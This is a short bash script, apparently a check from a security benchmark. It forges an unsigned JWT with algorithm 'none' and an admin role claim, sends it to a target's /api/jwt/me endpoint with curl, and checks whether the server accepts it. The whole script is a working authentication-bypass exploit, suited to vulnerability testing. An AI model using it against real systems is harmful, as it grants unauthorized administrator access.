#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
h=$(b64url '{"alg":"none","typ":"JWT"}')
p=$(b64url '{"sub":"admin@bench.local","role":"admin","exp":0}')
curl -s -H "Authorization: Bearer $h.$p." "$TARGET/api/jwt/me" | grep -F 'admin@bench.local'
